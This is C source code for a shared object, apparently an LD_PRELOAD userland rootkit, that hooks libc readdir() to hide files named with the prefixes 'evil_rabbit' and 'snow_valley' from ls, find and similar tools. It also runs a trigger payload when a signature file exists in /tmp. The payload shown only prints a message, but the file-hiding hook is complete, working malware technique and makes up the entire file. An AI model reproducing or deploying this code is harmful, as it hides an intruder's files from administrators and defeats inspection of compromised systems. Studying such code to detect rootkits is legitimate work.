/*
* Author: Abhinav Thakur
* Email : compilepeace@gmail.com
* Description: A shared object that hooks libc readdir() to conditionally execute some peaceful 
*              intentions and hide its presence (and practically all the files whose name starts with 
*              the HIDE_FILE macro defined below) from programs like /bin/ls, /usr/bin/find and 
*              basically every program using readdir() to parse filesystem.
*
* However, the peaceful intentions are only triggered if - 
*	-> There is SIGNATURE file present in /tmp directory.
*/


#define _GNU_SOURCE

#include <dlfcn.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <dirent.h>


#define HIDE_FILE   "evil_rabbit"
#define SIGNATURE "snow_valley"


static struct dirent* (*original_readdir)(DIR *dirp) = NULL;
static int PEACE_FLAG = 0;


void peace()
{
	printf("Attaining peace\n");
	return;
}



// Find the address of a symbol starting from our preloaded SO (malicious.so)
void *findSymbolAddress(char *symbol)
{
	void *address = dlsym(RTLD_NEXT, symbol);
	if (address == NULL) {
		//fprintf(stderr, "[-] (%s) Cannot find symbol address: %s\n", __FUNCTION__, symbol);
		exit(0x10);
	}

	return address;
}


// The  readdir() function returns a pointer to a dirent structure representing the next directory 
// entry in the directory stream pointed to by dirp.  It returns NULL on reaching the  end
// of the directory stream or if an error occurred.
struct dirent *readdir(DIR *dirp)
{

	// Get the address of original readdir() (present in libc)
	if (original_readdir == NULL)
        original_readdir = (struct dirent* (*)(DIR *))findSymbolAddress("readdir");


	{
		// PARSE the /tmp directory point
		// 1. Open up another directory stream to the "/tmp" directory.
		// 2. Search for a dirent present by the name of SIGNATURE in "/tmp" (only if PEACE_FLAG is not set),
		// 3. Call the peace() if "/tmp/SIGNATURE" is found.
		// 4. Set the PEACE_FLAG to 1.
		//
		DIR *chk_dirptr = opendir("/tmp/");			// <1>
		struct dirent *ent_ptr = NULL;

		while ( (ent_ptr = original_readdir(chk_dirptr)) != NULL && PEACE_FLAG == 0)		// <2>
		{
			if ( !strncmp(ent_ptr->d_name, SIGNATURE, strlen(SIGNATURE)) )
			{
				peace();			// <3>
				PEACE_FLAG = 1;		// <4>
				break;
			}
		}
	}

	
	struct dirent *dp = original_readdir(dirp);

	// Skip the directory entry whose d_name starts with (HIDE_FILE OR SIGNATURE) macro
	// (by reading another direntry)
	while ( dp != NULL && 
            ( !strncmp(dp->d_name, HIDE_FILE, strlen(HIDE_FILE)) || 
              !strncmp(dp->d_name, SIGNATURE, strlen(SIGNATURE)) )
		  ){
		dp = original_readdir(dirp);
	}

	return dp;
}

